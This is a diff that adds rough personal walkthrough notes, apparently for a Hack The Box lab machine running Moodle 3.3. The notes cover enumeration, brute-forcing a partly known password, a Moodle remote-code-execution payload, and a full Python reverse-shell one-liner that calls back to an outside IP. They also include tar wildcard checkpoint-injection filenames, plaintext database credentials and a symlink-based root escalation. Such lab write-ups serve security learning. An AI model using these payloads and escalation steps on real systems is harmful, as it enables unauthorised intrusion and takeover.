@@ -1,0 +1,104 @@
+10.10.10.153
+
+## USER DETAILS ##
+contact@blackhatuni.com
+
+
+# Began with standard enum. Nmap and gobuster
+
+# Only port open is a standard webpage
+
+# Webpage has a 'moodle' service active??
+
+# Could be CRSF here http://10.10.10.153/moodle/error/ 
+
+>>> http://10.10.10.153/moodle/tag/search.php
+
+# Seem to be using moodle ver 3.3
+
+# Search for the password:
+
+
+/lib (Status: 301)??
+
+/rating (Status: 301)
+/filter (Status: 301)
+/mod (Status: 301)
+/auth (Status: 301)
+/course (Status: 301)
+/error (Status: 301)
+/badges (Status: 301)
+/repository (Status: 301)
+/analytics (Status: 301)
+/availability (Status: 301)
+/webservice (Status: 301)
+/plagiarism (Status: 301)
+/competency (Status: 301)
+
+
+# Credentials:
+
+# Found a message encoded as a stupid image
+
+    Hi Servicedesk,
+
+    I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.
+
+    Could you guys figure out what the last charachter is, or just reset it?
+
+    Thanks,
+    Giovanni
+
+# Need to try and brute force it
+# After a brute force the missing character is a "#"
+
+# Creds
+>>> Giovanni
+>>> Th4C00lTheacha#
+
+# To get a shell it looks like I need to get evil:
+# https://blog.ripstech.com/2018/moodle-remote-code-execution/
+
+# Payload
+    /*{a*/`$_GET[0]`;//{x}}
+
+# Reverse shell
+&0=(python -c 'import socket,subprocess,os;IP="10.10.14.55";PORT=6868;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+
+# This provides us with a reverse shell!
+
+
+
+
+# Because of the wildcard on the tar command. We can give files in the directory names 
+# that act as params. However the use of "/*" in the code makes this attack non executable
+
+echo "" > "--checkpoint=1"
+echo "" > "--checkpoint-action=exec=shell.sh"
+
+# dbcreds
+root
+Welkom1!
+
+# The config.php contained information about a hosted databases
+mysql -P 3306 -u root -pWelkom1! moodle
+
+# Naviagating to the mdl_user, gives us a hash for the user
+
+>>> giovanni
+>>> expelled
+
+
+# ROOT
+# On the machine there is a process running called /usr/bin/backup.sh running as root
+
+    #!/bin/bash
+    cd /home/giovanni/work;
+    tar -czvf tmp/backup_courses.tar.gz courses/*;
+    cd tmp;
+    tar -xf backup_courses.tar.gz;
+    chmod 777 * -R
+
+# By adding a root directory symlink in the work directory. The chmod 777 * -R command runs over the root directory and allows us to read it
+
+# TODO: FIND A WAY TO ENUMERATE ACTIVE PORTS TO FIND THIS DB
